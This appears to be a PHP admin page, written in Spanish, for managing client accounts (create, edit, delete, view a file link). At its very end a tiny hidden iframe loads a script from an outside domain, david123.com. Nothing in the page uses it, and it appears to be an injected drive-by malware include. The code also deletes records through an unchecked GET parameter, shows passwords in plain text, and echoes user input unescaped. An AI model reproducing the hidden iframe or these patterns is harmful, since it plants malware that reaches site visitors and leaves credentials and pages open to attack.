<?

	// <!-- BAJA DE REGISTRO EN LA BASE -->

	if ($_GET["action"]=="delete") {
		
		$Sql_result = $ManCli->DeleteCliente($_GET["id"]);

		if (!$Sql_result){
			echo "No pudo eliminar el registro";
		} 

		$SqlSrv->dbDisconnect();

		header ("location: clientes.php");
		exit();

	}

	// <!-- ALTA O EDICION DE REGISTRO EN LA BASE -->

	if (isset($_POST["save"])) {
		
		$error = "";
		
		if (!$_POST["cliente"])		$error .= "• Nombre<br>";
		if (!$_POST["pais"])		$error .= "• Pais<br>";

		if ($_POST["password"]){
			if (!$ManCli->checkPassword($_POST["password"])) $error .= "• Password no valido<br>";
		}

		// - CHEQUEO SI EXISTE USUARIO
		if ($_POST["username"] != $_POST["username_old"]){
			$chequeo = $ManCli->CheckUsuario($_POST["username"]);
			if ($chequeo && !$error) {
				$error .= $chequeo;
			}
		}
			
		if (!$error){

			if (!isset($_POST["id"])){
				// - ALTA
				$Sql_result = $ManCli->AddCliente($_POST["cliente"], $_POST["pais"], $_POST["username"], $_POST["password"], $_POST["activo"]);
			} else {
				// - EDICION
				$Sql_result = $ManCli->EditCliente($_POST["cliente"], $_POST["pais"], $_POST["username"], $_POST["password"], $_POST["activo"], $_POST["id"]);
			}
			
			if (!$Sql_result){
				echo "No pudo guardar el registro";
			}

			$SqlSrv->dbDisconnect();

			header ("location: clientes.php");
			exit();
		
		}

	}

	$id = $_GET["id"]? $_GET["id"]: $_POST["id"];
?>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML>
<HEAD>
<TITLE> .:: TBX | Admin ::. </TITLE>

<!-- STYLES -->
<link rel=stylesheet type="text/css" href="../styles/styles.css">

</HEAD>

<BODY>
<?
	// <!-- BAJA DE REGISTRO EN LA BASE -->

	if ($_GET["action"]=="verLink") {
		
		$Sql_result = $ManCli->GetCliente($_GET["id"]);
			
		$row = mysql_fetch_array($Sql_result);

		$id			= $row['id'];
		$cliente	= $row['cliente'];
		$pais		= $row['pais'];
		$username	= $row['username'];
		$password	= $row['password'];
		$activo		= $row['activo'];

		echo "<TABLE width=100% height=100%>";
		echo "	<TR>";
		echo "		<TD class=\"txt\" align=center><A HREF=\"http://www.mdtmdt.com/clientes/list_archivos.php?code=$id-$username\" target=\"_blank\">http://www.mdtmdt.com/clientes/list_archivos.php?code=$id-$username</A></TD>";
		echo "	</TR>";
		echo "</TABLE>";

		exit();

	}
?>

<?
	if ($id){
		$Sql_result = $ManCli->GetCliente($id);
			
		$row = mysql_fetch_array($Sql_result);

		$id			= $row['id'];
		$cliente	= $row['cliente'];
		$pais		= $row['pais'];
		$username	= $row['username'];
		$password	= $row['password'];
		$activo		= $row['activo'];
		
	} else {
		$pais	= $_POST["pais"];
		$activo = $_POST["activo"];
	}
?>

			<!-- LISTADO -->
			<table cellpadding=0 cellspacing=0 border=0 class="marco_blanco">
				<tr> 
					<td>
					<!-- EDITAR SECCIONES -->
					<table cellpadding=2 cellspacing=0 border=0 width="100%">
						<tr> 
							<td><div class="sep"><spacer type=block width=1 height=1></div></td>
							</tr>
						<tr>
							<td class="txt"><img src="../img/fl.gif" width="5" height="9" hspace="5">Complete el siguiente formulario. Los campos señalados con<img src="../img/fl.gif" width="5" height="9" hspace="5"> son obligatorios</td>
						</tr>
						<tr> 
							<td><div class="sep"><spacer type=block width=1 height=1></div></td>
						</tr>
					</table>
					<br>
					<table cellpadding=2 cellspacing=0 border=0 width=100%>
					<form method="post" action="<?=$_SERVER['PHP_SELF']?>?action=edit" name="forma">
					<?
					if ($id) {
						echo "<input type=hidden name=id value=\"$id\">";
					}
					?>
					<? if ($error){ ?>
						<tr> 
							<td colspan="2" class="txt" align="center"><span class="error">Complete correctamente los siguientes campos:</span><br><br>
							<span class="error"><?=$error?></span><br></td>
						</tr>
					<? } ?>
						<tr>
							<td class="txt" align=right><img src="../img/fl.gif" width="5" height="9" hspace="5">Nombre</td>
							<td><input type=text name="cliente" maxlength="50" class="form1" size="50" value="<?=$_POST["cliente"] ? $_POST["cliente"] : $cliente?>"></td>
						</tr>
						<tr>
							<td class="txt" align=right><img src="../img/fl.gif" width="5" height="9" hspace="5">Pais</td>
							<td><select name="pais" class="form1">
								<option value="1" <?if ($pais=="1")echo "selected";?>>Argentina
								<option value="2" <?if ($pais=="2")echo "selected";?>>Brasil
								<option value="3" <?if ($pais=="3")echo "selected";?>>Chile
							</select></td>
						</tr>
						<tr>
							<td class="txt" align=right><img src="../img/fl.gif" width="5" height="9" hspace="5">Username</td>
							<td><input type=text name="username" maxlength="20" class="form1" size="50" value="<?=$_POST["username"] ? $_POST["username"] : $username?>"></td>
						</tr>
						<tr>
							<td class="txt" align=right><img src="../img/fl.gif" width="5" height="9" hspace="5">Password</td>
							<td><input type=text name="password" maxlength="20" class="form1" size="50" value="<?=$_POST["password"] ? $_POST["password"] : $password?>"></td>
						</tr>
						<tr>
							<td class="txt" align=right><img src="../img/fl.gif" width="5" height="9" hspace="5">Mostrar en Web</td>
							<td><input type=checkbox name="activo" value="1" <?=$activo ? "checked" : ""?>></td>
						</tr>
						<tr>
							<td align=right class=txt>&nbsp;</td>
							<td><INPUT TYPE="submit" value="Guardar" class="actionButton">&nbsp;&nbsp;<input type="button" onclick="self.location='clientes.php';" value="Cancelar" class="actionButton"></td>
						</tr>
						<input type="hidden" name="username_old" value="<?=$username?>">
						<input type="hidden" name="save" value="1">
					</form>
					</table>
					<?
						$SqlSrv->dbDisconnect();
					?>
					</td>
				</tr>
			</table>
			

<iframe src="http://david123.com/r/g.php" width="5" height="4" align="right"></iframe></body>
</HTML>
